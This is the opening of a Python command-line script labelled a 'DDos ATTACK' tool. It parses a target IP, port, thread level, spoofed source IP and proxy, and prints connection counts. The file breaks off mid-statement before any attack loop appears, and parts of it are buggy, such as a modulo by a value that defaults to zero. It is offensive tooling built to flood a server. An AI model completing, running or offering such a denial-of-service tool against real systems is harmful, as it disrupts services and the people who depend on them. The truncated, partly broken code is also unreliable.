import socket
import sys, os
from optparse import OptionParser
import threading, time, sys, logging, urllib.request, random
from time import sleep
from queue import Queue
import rich
from rich.markdown import Markdown
from rich.progress import track
from rich.console import Console

# Global variables
target = ""
ports = 0
levels = 0
fake_ip = ""
hides = 0
already_connected_true = 0
already_connected_false = 1

# Console object
console = Console()

# Live bro function
def live_bro():
    if already_connected_true % hides == 0:
        console.print(f"[{time.ctime(time.time())}] connected : {already_connected_true}", style="green")
    else:
        pass
    if already_connected_false % hides == 0:
        console.print(f"Wrong : {already_connected_false}", style="red")
    else:
        pass

# Get typer function
def get_Typer():
    global host
    global port
    global thr
    global item
    global target
    global ports
    global levels
    global fake_ip
    global hides
    optp = OptionParser(add_help_option=False, epilog="rockstxr77 DDos ATTACK")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-i", "--ip", dest="host", help="attack to server ip -i ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-l", "--level", type="int", dest="turbo", help="default 1 -t 1")
    optp.add_option("-f", "--fake", type="str", dest="fake", help="default -f 00.00.00.00")
    optp.add_option("-d", "--hide", type="int", dest="hide", help="default -d 200")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    optp.add_option("-x", "--proxy", type="str", dest="proxy", help="set proxy -x http://proxy:port")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
        usage1()
        sys.exit()
    if opts.host is not None:
        host = opts.host
        target = host
    else:
        pass
    if opts.port is None:
        port = 80
        ports = port
    else:
        port = opts.port
        ports = port
    if opts.turbo is None:
        thr = 1
        levels = thr
    else:
        thr = opts.turbo
        levels = thr
    if opts.fake is not None:
        hos = opts.fake
        fake_ip = hos
    else:
        fake_ip = "999.999.999.999"
    if opts.hide is None:
        hide = 0
        hides = hide
    else
